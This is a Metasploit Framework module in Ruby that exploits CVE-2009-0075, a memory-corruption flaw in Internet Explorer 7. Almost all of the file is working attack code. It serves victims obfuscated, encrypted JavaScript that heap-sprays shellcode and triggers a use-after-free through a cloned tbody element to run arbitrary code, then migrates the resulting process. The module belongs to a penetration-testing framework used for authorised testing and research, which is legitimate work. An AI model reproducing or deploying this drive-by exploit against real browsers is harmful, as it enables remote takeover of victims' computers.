##
# $Id: ms09_002_memory_corruption.rb 9787 2010-07-12 02:51:50Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	#
	# Superceded by ms10_018_ie_behaviors, disable for BrowserAutopwn
	#
	#include Msf::Exploit::Remote::BrowserAutopwn
	#autopwn_info({
	#	:ua_name    => HttpClients::IE,
	#	:ua_minver  => "7.0",
	#	:ua_maxver  => "7.0",
	#	:javascript => true,
	#	:os_name    => OperatingSystems::WINDOWS,
	#	:vuln_test  => nil, # no way to test without just trying it
	#})

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer 7 CFunctionPointer Uninitialized Memory Corruption',
			'Description'    => %q{
				This module exploits an error related to the CFunctionPointer function when attempting
				to access uninitialized memory. A remote attacker could exploit this vulnerability to
				corrupt memory and execute arbitrary code on the system with the privileges of the victim.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'dean [at] zerodaysolutions [dot] com' ],
			'Version'        => '$Revision: 9787 $',
			'References'     =>
				[
					[ 'CVE', '2009-0075' ],
					[ 'OSVDB', '51839' ],
					[ 'MSB', 'MS09-002' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP2-SP3 / Windows Vista SP0 / IE 7', { 'Ret' => 0x0C0C0C0C } ]
				],
			'DisclosureDate' => 'Feb 17 2008',
			'DefaultTarget'  => 0))

		@javascript_encode_key = rand_text_alpha(rand(10) + 10)
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)

		if (!request.uri.match(/\?\w+/))
			send_local_redirect(cli, "?#{@javascript_encode_key}")
			return
		end

		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Set the return.
		ret     = Rex::Text.to_unescape([target.ret].pack('V'))

		# Randomize the javascript variable names.
		rand1   = rand_text_alpha(rand(100) + 1)
		rand2   = rand_text_alpha(rand(100) + 1)
		rand3   = rand_text_alpha(rand(100) + 1)
		rand4   = rand_text_alpha(rand(100) + 1)
		rand5   = rand_text_alpha(rand(100) + 1)
		rand6   = rand_text_alpha(rand(100) + 1)
		rand7   = rand_text_alpha(rand(100) + 1)
		rand8   = rand_text_alpha(rand(100) + 1)
		rand9   = rand_text_alpha(rand(100) + 1)
		rand10  = rand_text_alpha(rand(100) + 1)
		rand11  = rand_text_alpha(rand(100) + 1)
		rand12  = rand_text_alpha(rand(100) + 1)
		rand13  = rand_text_alpha(rand(100) + 1)
		fill    = rand_text_alpha(25)

		js = %Q|
var #{rand1} = unescape("#{shellcode}");
var #{rand2} = new Array();
var #{rand3} = 0x100000-(#{rand1}.length*2+0x01020);
var #{rand4} = unescape("#{ret}");
while(#{rand4}.length<#{rand3}/2)
{#{rand4}+=#{rand4};}
var #{rand5} = #{rand4}.substring(0,#{rand3}/2);
delete #{rand4};
for(#{rand6}=0;#{rand6}<0xC0;#{rand6}++) {#{rand2}[#{rand6}] = #{rand5} + #{rand1};}
CollectGarbage();
var #{rand7} = unescape("#{ret}"+"#{fill}");
var #{rand8} = new Array();
for(var #{rand9}=0;#{rand9}<1000;#{rand9}++)
#{rand8}.push(document.createElement("img"));
function #{rand10}()
{
#{rand11} = document.createElement("tbody");
#{rand11}.click;
var #{rand12} = #{rand11}.cloneNode();
#{rand11}.clearAttributes();
#{rand11}=null;
CollectGarbage();
for(var #{rand13}=0;#{rand13}<#{rand8}.length;#{rand13}++)
#{rand8}[#{rand13}].src=#{rand7};
#{rand12}.click;
}
window.setTimeout("#{rand10}();",800);
|
		js = encrypt_js(js, @javascript_encode_key)

		content = %Q|<html>
<script language="JavaScript">
#{js}
</script>
</html>
|

		content = Rex::Text.randomize_space(content)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end
end
